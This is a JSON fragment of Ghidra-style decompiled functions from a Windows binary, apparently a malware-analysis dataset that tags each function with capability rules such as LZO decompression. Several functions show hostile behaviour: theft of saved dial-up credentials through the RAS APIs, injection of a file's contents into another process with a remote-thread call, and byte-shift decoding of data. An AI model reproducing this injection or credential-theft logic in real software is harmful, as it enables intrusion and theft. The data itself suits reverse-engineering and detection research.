        "decompiled_code": "\nvoid __fastcall fcn.004591f8(int32_t param_1, int32_t *param_2)\n\n{\n    bool bVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    var_18h = *param_2;\n    var_14h = param_2[1];\n    iVar4 = param_2[3];\n    *(in_EAX + 0x96) = 1;\n    uStack56 = 0x4593dc;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack60;\n    var_4h = in_EAX;\n    fcn.0044fcf4();\n    fcn.00451024();\n    iVar2 = fcn.004431c0();\n    if (iVar2 < var_4h[0x13] + var_14h) {\n        var_14h = fcn.004431c0();\n        var_14h = var_14h - var_4h[0x13];\n    }\n    iVar2 = fcn.004431cc();\n    if (iVar2 < var_4h[0x12] + var_18h) {\n        var_18h = fcn.004431cc();\n        var_18h = var_18h - var_4h[0x12];\n    }\n    iVar2 = fcn.004431b4();\n    if (var_18h < iVar2) {\n        var_18h = fcn.004431b4();\n    }\n    iVar2 = fcn.004431a8();\n    if (iVar4 + 4 < iVar2) {\n        fcn.004431a8();\n    }\n    uVar3 = fcn.00457a28(0xffffffff, var_18h, var_14h, var_4h[0x12], var_4h[0x13], 0x10);\n    sub.user32.dll_SetWindowPos(uVar3);\n    iVar4 = sub.kernel32.dll_GetTickCount_1();\n    if (iVar4 - var_4h[0x97] < 0xfb) {\n        bVar1 = false;\n    }\n    else {\n        if (param_1 != 0) {\n            param_1 = *(param_1 + -4);\n        }\n        bVar1 = param_1 < 100;\n    }\n    if ((bVar1) && (*0x491630 != NULL)) {\n        sub.user32.dll_SystemParametersInfoA(0x1016, 0, &var_8h, 0);\n        if (var_8h != 0) {\n            sub.user32.dll_SystemParametersInfoA(0x1018, 0, &var_8h, 0);\n            if (var_8h == 0) {\n                fcn.0045c9b8();\n                if (var_14h < var_1ch) {\n                    iVar4 = 0;\n                }\n                else {\n                    iVar4 = 1;\n                }\n            }\n            else {\n                iVar4 = 2;\n            }\n            uVar3 = fcn.00457a28(100, *(iVar4 * 4 + 0x491738) | 0x40000);\n            (**0x491630)(uVar3);\n        }\n    }\n    fcn.00454638();\n    uVar3 = fcn.00457a28(4);\n    sub.user32.dll_ShowWindow();\n    (**(*var_4h + 0x80))();\n    *in_FS_OFFSET = uVar3;\n    iVar4 = sub.kernel32.dll_GetTickCount_1(0x4593e3);\n    var_4h[0x97] = iVar4;\n    *(var_4h + 0x96) = 0;\n    return;\n}\n",
        "token_count": 942
    },
    "0045b7f8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045b7f8(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x45b80a;\n    fcn.004058ec();\n    uStack24 = 0x45b867;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    puStack20 = &stack0xfffffffc;\n    (**(**(arg_8h + -4) + 0x10))();\n    if (0 < in_EAX) {\n        (**(**(arg_8h + -4) + 0x10))();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x45b86e;\n    uStack24 = 0x45b866;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 262
    },
    "0045e980": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0045e980(void)\n\n{\n    fcn.004058fc();\n    fcn.0045e9dc();\n    fcn.0045eb5c();\n    return;\n}\n",
        "token_count": 44
    },
    "0045ee64": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045ee64(uint param_1, int16_t *param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int16_t iVar2;\n    \n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    iVar2 = in_EAX * 2;\n    *param_2 = iVar2;\n    param_2[1] = iVar2 + 2;\n    uVar1 = fcn.00402ef0();\n    *(param_2 + 2) = uVar1;\n    fcn.00406360();\n    return;\n}\n",
        "token_count": 146
    },
    "0045f024": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045f024(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    fcn.00405784(param_1);\n    uVar1 = fcn.0040595c();\n    sub.kernel32.dll_lstrlenA_1(uVar1);\n    fcn.00405b8c();\n    iVar2 = *param_2;\n    if (iVar2 != 0) {\n        iVar2 = *(iVar2 + -4);\n    }\n    if (*(*param_2 + iVar2) != '\\\\') {\n        fcn.00405738();\n    }\n    fcn.00405738();\n    return;\n}\n",
        "token_count": 156
    },
    "0045f31c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0045f31c(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint *arg_8h;\n    uint *arg_8h_00;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uchar uVar5;\n    uint in_stack_fffff2cc;\n    uint uStack3324;\n    uint uStack3320;\n    uchar *puStack3316;\n    uint var_ce0h;\n    uint var_cdch;\n    uint var_cd8h;\n    uint var_cd4h;\n    uint var_bd4h;\n    uint var_bd0h;\n    uint var_bcch;\n    uint var_4e4h;\n    uint var_4e0h;\n    uint var_2ddh;\n    uint var_1dch;\n    uint lpVersionInformation;\n    uint32_t var_c4h;\n    int32_t var_b8h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    char *var_ch;\n    char *var_8h;\n    uint *var_4h;\n    \n    puStack3316 = &stack0xfffffffc;\n    var_4h = NULL;\n    var_8h = NULL;\n    var_ch = NULL;\n    var_10h = 0;\n    var_14h = 0;\n    var_18h = 0;\n    uStack3320 = 0x45f6fa;\n    uStack3324 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack3324;\n    var_1ch = in_EAX;\n    fcn.0040546c();\n    var_28h = fcn.0045f0d4();\n    if (var_28h != 0) {\n        fcn.00406a14(var_28h);\n        *var_4h = 0x108;\n        var_20h = var_28h * 0x108;\n        iVar1 = sub.rasapi32.dll_RasEnumEntriesA(0, 0, var_4h, &var_20h, &var_28h);\n        if (iVar1 == 0) {\n            lpVersionInformation = 0x94;\n            sub.kernel32.dll_GetVersionExA(&lpVersionInformation);\n            fcn.00405b8c();\n            fcn.00405b8c();\n            if ((var_b8h == 2) && (4 < var_c4h)) {\n                uVar2 = fcn.0040595c(0x1a, 0);\n                iVar1 = sub.shell32.dll_SHGetSpecialFolderPathA(0, uVar2);\n                if (iVar1 != 0) {\n                    fcn.0045f024();\n                    fcn.00405504();\n                }\n                uVar2 = fcn.0040595c(0x23, 0);\n                in_stack_fffff2cc = 0;\n                iVar1 = sub.shell32.dll_SHGetSpecialFolderPathA(0, uVar2);\n                if (iVar1 != 0) {\n                    fcn.0045f024();\n                    fcn.00405504();\n                }\n                fcn.0045ef18();\n            }\n            var_2ch = 0xffffffff;\n            if (-1 < var_28h + -1) {\n                var_30h = var_28h;\n                do {\n                    var_4e4h = 0x41c;\n                    fcn.004030ec();\n                    sub.rasapi32.dll_RasGetEntryDialParamsA(0, &var_4e4h, &var_2ch);\n                    var_20h = 0x6e8;\n                    fcn.00403aac();\n                    arg_8h_00 = &var_24h;\n                    fcn.0045f2a0(arg_8h_00, 0, &var_20h);\n                    if (((var_b8h == 2) && (4 < var_c4h)) && ((*var_8h != '\\0' || (*var_ch != '\\0')))) {\n                        fcn.00405664();\n                        fcn.004075a4();\n                        uVar2 = fcn.0040595c();\n                        puVar3 = fcn.004058fc(0x45f708, 0, uVar2);\n                        arg_8h_00 = puVar3;\n                        arg_8h = sub.kernel32.dll_GetPrivateProfileIntA();\n                        if (arg_8h == NULL) {\n                            fcn.0040595c();\n                            arg_8h = sub.kernel32.dll_GetPrivateProfileIntA();\n                            arg_8h_00 = puVar3;\n                        }\n                        if (arg_8h == NULL) {\n                            uVar2 = fcn.0040595c(arg_8h_00);\n                            arg_8h_00 = fcn.004058fc(0x45f708, 0, uVar2);\n                            arg_8h = sub.kernel32.dll_GetPrivateProfileIntA();\n                        }\n                        if (arg_8h == NULL) {\n                            uVar2 = fcn.0040595c(arg_8h_00);\n                            arg_8h_00 = fcn.004058fc(0x45f708, 0, uVar2);\n                            arg_8h = sub.kernel32.dll_GetPrivateProfileIntA();\n                        }\n                        if (arg_8h != NULL) {\n                            uVar5 = 1;\n                            fcn.00406624(arg_8h, 0);\n                            fcn.004056d0();\n                            iVar4 = 0x100;\n                            iVar1 = 0x497ce8;\n                            arg_8h_00 = arg_8h;\n                            do {\n                                fcn.00405894();\n                                if ((uVar5) && (*(iVar1 + 4) != 0)) {\n                                    var_34h = *(iVar1 + 4);\n                                    if (var_34h != 0) {\n                                        var_34h = *(var_34h + -4);\n                                    }\n                                    fcn.004058fc();\n                                    fcn.0045f11c();\n                                }\n                                iVar1 = iVar1 + 8;\n                                iVar4 = iVar4 + -1;\n                                uVar5 = iVar4 == 0;\n                            } while (!uVar5);\n                        }\n                    }\n                    fcn.00405664(0x45f720, *var_1ch, arg_8h_00);\n                    fcn.00405664(0x45f730, 0);\n                    in_stack_fffff2cc = 0x45f748;\n                    fcn.00405800(0x45f748, 0x45f73c, 0);\n                    var_30h = var_30h + -1;\n                } while (var_30h != 0);\n            }\n        }\n    }\n    *in_FS_OFFSET = in_stack_fffff2cc;\n    fcn.00405490(0x45f701);\n    fcn.00405490();\n    fcn.00405490();\n    fcn.00406a20();\n    return;\n}\n",
        "token_count": 1642
    },
    "0045f7b8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045f7b8(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint lpsz;\n    \n    fcn.004058fc();\n    fcn.0040555c();\n    iVar1 = in_EAX;\n    if (in_EAX != 0) {\n        iVar1 = *(in_EAX + -4);\n    }\n    if (0 < iVar1) {\n        if (in_EAX != 0) {\n            in_EAX = *(in_EAX + -4);\n        }\n        sub.user32.dll_CharUpperBuffA(*param_2, in_EAX);\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "0045f80c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0045f80c(void)\n\n{\n    uint32_t in_EAX;\n    uint16_t uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = 0x45f828;\n    fcn.004058ec();\n    uStack40 = 0x45f8d5;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.0045f7b8();\n    fcn.00405504();\n    if (in_EAX != 0) {\n        if (in_EAX != 0) {\n            in_EAX = *(in_EAX - 4);\n        }\n        uVar1 = in_EAX;\n        while (uVar1 != 0) {\n            fcn.00405654();\n            fcn.00405a48();\n            uVar1 = in_EAX - 1;\n            in_EAX = uVar1;\n        }\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x45f8dc;\n    uStack40 = 0x45f8cc;\n    fcn.00405490();\n    uStack40 = 0x45f8d4;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 339
    },
    "0045f8e8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0045f98d)\n// WARNING: Removing unreachable block (ram,0x0045f997)\n\nvoid fcn.0045f8e8(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x45f9dc;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    fcn.0040546c();\n    iVar2 = in_EAX;\n    if (in_EAX != 0) {\n        iVar2 = *(in_EAX + -4);\n    }\n    if (0 < iVar2) {\n        iVar3 = 1;\n        do {\n            uVar1 = *(in_EAX + -1 + iVar3);\n            if (uVar1 < 0x41) {\n                if ((uVar1 != 0x20) && (1 < uVar1 - 0x28)) {\n                    if (uVar1 - 0x30 < 10) goto code_r0x0045f96e;\n                    break;\n                }\n            }\n            else {\n                if (5 < uVar1 - 0x41) {\n                    if ((uVar1 == 0x5b) || (uVar1 == 0x5d)) goto code_r0x0045f986;\n                    if (5 < uVar1 - 0x61) break;\n                }\ncode_r0x0045f96e:\n                fcn.00405654();\n                fcn.00405738();\n            }\ncode_r0x0045f986:\n            iVar3 = iVar3 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x45f9e3;\n    uStack40 = 0x45f9d3;\n    fcn.0040546c();\n    uStack40 = 0x45f9db;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 539
    },
    "0045fa08": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0045fa08(void)\n\n{\n    bool bVar1;\n    uint32_t in_EAX;\n    uint16_t uVar2;\n    uint32_t uVar4;\n    uint32_t uVar3;\n    \n    bVar1 = true;\n    uVar3 = in_EAX;\n    if (in_EAX != 0) {\n        uVar3 = *(in_EAX - 4);\n    }\n    if (uVar3 != 0) {\n        uVar4 = 1;\n        do {\n            if ((bVar1) && (*((in_EAX - 1) + (uVar4 & 0xffff)) - 0x30U < 10)) {\n                bVar1 = true;\n            }\n            else {\n                bVar1 = false;\n            }\n            uVar4 = uVar4 + 1;\n            uVar2 = uVar3 - 1;\n            uVar3 = uVar2;\n        } while (uVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 223
    },
    "0045fb80": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045fb80(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x45fb93;\n    fcn.004058ec();\n    uStack24 = 0x45fbec;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar1 = in_EAX;\n    if (in_EAX != 0) {\n        iVar1 = *(in_EAX + -4);\n    }\n    puStack20 = &stack0xfffffffc;\n    if (0 < iVar1) {\n        do {\n            if (*(in_EAX + -1 + iVar1) == '\\\\') {\n                puStack20 = &stack0xfffffffc;\n                fcn.00405964();\n                uStack32 = param_2;\n                break;\n            }\n            iVar1 = iVar1 + -1;\n            puStack20 = &stack0xfffffffc;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack32;\n    uStack24 = 0x45fbf3;\n    uStack28 = 0x45fbeb;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 319
    },
    "00460464": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00460464(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    fcn.004058fc();\n    fcn.0040555c();\n    if (0 < in_EAX) {\n        sub.user32.dll_CharUpperBuffA(*param_2, in_EAX);\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "004604b8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004604b8(void)\n\n{\n    uint32_t in_EAX;\n    uint16_t uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = 0x4604d4;\n    fcn.004058ec();\n    uStack40 = 0x460581;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.00460464();\n    fcn.00405504();\n    if (in_EAX != 0) {\n        if (in_EAX != 0) {\n            in_EAX = *(in_EAX - 4);\n        }\n        uVar1 = in_EAX;\n        while (uVar1 != 0) {\n            fcn.00405654();\n            fcn.00405a48();\n            uVar1 = in_EAX - 1;\n            in_EAX = uVar1;\n        }\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x460588;\n    uStack40 = 0x460578;\n    fcn.00405490();\n    uStack40 = 0x460580;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 326
    },
    "00460594": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00460639)\n// WARNING: Removing unreachable block (ram,0x00460643)\n\nvoid fcn.00460594(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x460688;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    fcn.0040546c();\n    iVar2 = in_EAX;\n    if (in_EAX != 0) {\n        iVar2 = *(in_EAX + -4);\n    }\n    if (0 < iVar2) {\n        iVar3 = 1;\n        do {\n            uVar1 = *(in_EAX + -1 + iVar3);\n            if (uVar1 < 0x41) {\n                if ((uVar1 != 0x20) && (1 < uVar1 - 0x28)) {\n                    if (uVar1 - 0x30 < 10) goto code_r0x0046061a;\n                    break;\n                }\n            }\n            else {\n                if (5 < uVar1 - 0x41) {\n                    if ((uVar1 == 0x5b) || (uVar1 == 0x5d)) goto code_r0x00460632;\n                    if (5 < uVar1 - 0x61) break;\n                }\ncode_r0x0046061a:\n                fcn.00405654();\n                fcn.00405738();\n            }\ncode_r0x00460632:\n            iVar3 = iVar3 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x46068f;\n    uStack40 = 0x46067f;\n    fcn.0040546c();\n    uStack40 = 0x460687;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 521
    },
    "00460a48": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00460a48(uint param_1, uint *param_2)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack676;\n    uint *puStack668;\n    uint uStack664;\n    uchar *puStack660;\n    uint var_288h;\n    uint var_284h;\n    uint var_184h;\n    uint var_180h;\n    uint var_17ch;\n    uint var_178h;\n    uint var_174h;\n    uint lpFindFileData;\n    uint var_144h;\n    uint var_2dh;\n    int32_t hFindFile;\n    uint *var_8h;\n    uint var_4h;\n    \n    puStack660 = 0x460a80;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.004058ec();\n    uStack664 = 0x460c8a;\n    puStack668 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffd64;\n    puStack660 = &stack0xfffffffc;\n    fcn.004058fc();\n    fcn.00405664();\n    fcn.00405784(&fcn.00460a48::lpFindFileData);\n    iStack676 = fcn.004058fc();\n    hFindFile = sub.kernel32.dll_FindFirstFileA_1();\n    if (hFindFile != -1) {\n        do {\n            fcn.004056dc(0x460cb0, var_4h);\n            uStack664 = 0;\n            fcn.00405800();\n            fcn.004058fc();\n            fcn.0046069c();\n            if ((*0x4984f4 != 0) && (*0x4984f8 != 0)) {\n                fcn.004603c4();\n                fcn.004054c0();\n                iVar1 = fcn.00460594();\n                if (-1 < iVar1 + -1) {\n                    puVar2 = &fcn.00460a48::var_2dh;\n                    iVar3 = iVar1;\n                    do {\n                        *puVar2 = *puVar2 + -5;\n                        puVar2 = puVar2 + 1;\n                        iVar3 = iVar3 + -1;\n                    } while (iVar3 != 0);\n                }\n                *(&fcn.00460a48::var_2dh + iVar1) = 0;\n                fcn.00403ea8();\n                fcn.004056d0();\n                fcn.00405664(0x460ccc, *0x4984f4, 0x460cbc, *var_8h);\n                uStack664 = 0x460ce4;\n                fcn.00405800();\n            }\n            puStack668 = &fcn.00460a48::lpFindFileData;\n            iVar1 = sub.kernel32.dll_FindNextFileA(hFindFile);\n        } while (iVar1 != 0);\n        iStack676 = hFindFile;\n        sub.kernel32.dll_FindClose_1();\n    }\n    *in_FS_OFFSET = iStack676;\n    puStack668 = 0x460c91;\n    fcn.0040546c();\n    fcn.0040546c();\n    fcn.00405490();\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 762
    },
    "00461920": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00461a2a)\n// WARNING: Removing unreachable block (ram,0x00461a55)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00461920(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t nNumberOfBytesToRead;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint lpNumberOfBytesRead;\n    uint var_8h;\n    uint lpBuffer;\n    \n    puStack108 = &stack0xfffffffc;\n    uStack112 = 0x461b9e;\n    uStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack116;\n    uVar1 = sub.kernel32.dll_OpenProcess(0x1f0fff, 0, param_1);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x461bbc, 0x461bac);\n    var_4ch = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x461bdc, 0x461bcc);\n    var_48h = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x461bbc, 0x461be4);\n    var_3ch = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x461bbc, 0x461bf0);\n    var_40h = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x461bbc, 0x461bfc);\n    var_44h = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x461bbc, 0x461c10);\n    var_38h = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x461bbc, 0x461c1c);\n    var_34h = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x461bbc, 0x461c28);\n    var_30h = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    var_50h._0_1_ = 1;\n    var_14h = param_2;\n    fcn.00405664();\n    var_18h = (**0x49854c)(uVar1, 0, 1, 0x3000, 0x40);\n    fcn.00405664();\n    (**0x498550)(uVar1, var_18h);\n    uVar2 = sub.kernel32.dll_CreateFileA_1();\n    nNumberOfBytesToRead = sub.kernel32.dll_GetFileSize_1(uVar2, 0);\n    sub.kernel32.dll_CloseHandle_1(uVar2);\n    lpBuffer = (**0x498548)(0, nNumberOfBytesToRead, 0x3000, 0x40);\n    uVar2 = sub.kernel32.dll_CreateFileA_1();\n    sub.kernel32.dll_ReadFile_1(uVar2, lpBuffer, nNumberOfBytesToRead, &lpNumberOfBytesRead, 0);\n    sub.kernel32.dll_CloseHandle_1(uVar2);\n    var_1ch = (**0x49854c)(uVar1, 0, nNumberOfBytesToRead, 0x3000, 0x40);\n    (**0x498550)(uVar1, var_1ch, lpBuffer, nNumberOfBytesToRead + 1, &var_8h);\n    uVar2 = (**0x49854c)(uVar1, 0, 0x40, 0x3000, 0x40);\n    (**0x498550)(uVar1, uVar2, &var_50h, 0x40, &var_8h);\n    uVar3 = (**0x49854c)(uVar1, 0, 0xd4, 0x3000, 0x40);\n    (**0x498550)(uVar1, uVar3, fcn.00461848, 0xd4, &var_8h);\n    (**0x498558)(uVar1, 0, 0, uVar3, uVar2, 0, &var_10h);\n    *in_FS_OFFSET = uVar1;\n    fcn.00405490(0x461ba5);\n    return;\n}\n",
        "token_count": 1178
    },
    "00461de8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00461de8(uint param_1)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    fcn.00405b8c(param_1);\n    iVar2 = *in_EAX;\n    if (iVar2 != 0) {\n        iVar2 = *(iVar2 + -4);\n    }\n    uVar1 = fcn.004058fc(iVar2);\n    sub.kernel32.dll_GetWindowsDirectoryA(uVar1);\n    fcn.00405b8c();\n    fcn.00405738();\n    return;\n}\n",
        "token_count": 135
    },
    "00463d14": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00463d14(uint param_1)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = fcn.0040aaa0(param_1);\n    sub.kernel32.dll_GetSystemDirectoryA(uVar1, 0x104);\n    fcn.00405664();\n    iVar2 = *in_EAX;\n    if (iVar2 != 0) {\n        iVar2 = *(iVar2 + -4);\n    }\n    if (*(*in_EAX + -1 + iVar2) != '\\\\') {\n        fcn.00405738();\n    }\n    fcn.0040aaec();\n    return;\n}\n",
        "token_count": 155
    },
    "00463d78": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00463d78(uint param_1)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    fcn.00405b8c(param_1);\n    iVar2 = *in_EAX;\n    if (iVar2 != 0) {\n        iVar2 = *(iVar2 + -4);\n    }\n    uVar1 = fcn.004058fc();\n    sub.kernel32.dll_GetTempPathA(iVar2, uVar1);\n    fcn.00405b8c();\n    return;\n}\n",
        "token_count": 128
    },
    "00465ee0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00465ee0(int32_t arg_8h)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff60;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uStack84;\n    uint uStack80;\n    uchar *puStack76;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_2ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack76 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack80 = 0x466051;\n    uStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack84;\n    puVar1 = &stack0xfffffffc;\n    if (arg_8h != 0) {\n        fcn.00405b8c();\n        iVar3 = var_4h;\n        if (var_4h != 0) {\n            iVar3 = *(var_4h + -4);\n        }\n        uVar2 = fcn.004058fc(iVar3);\n        sub.user32.dll_GetWindowTextA(arg_8h, uVar2);\n        fcn.00405b8c();\n        var_34h = 0x2c;\n        sub.user32.dll_GetWindowPlacement(arg_8h, &var_34h);\n        if (var_2ch == 3) {\n            fcn.00405504();\n        }\n        else if (var_2ch == 1) {\n            fcn.00405504();\n        }\n        else if (var_2ch == 2) {\n            fcn.00405504();\n        }\n        else if (var_2ch == 8) {\n            fcn.00405504();\n        }\n        else if (var_2ch == 4) {\n            fcn.00405504();\n        }\n        iVar3 = sub.user32.dll_IsWindowVisible(arg_8h);\n        puVar1 = puStack76;\n        if ((iVar3 != 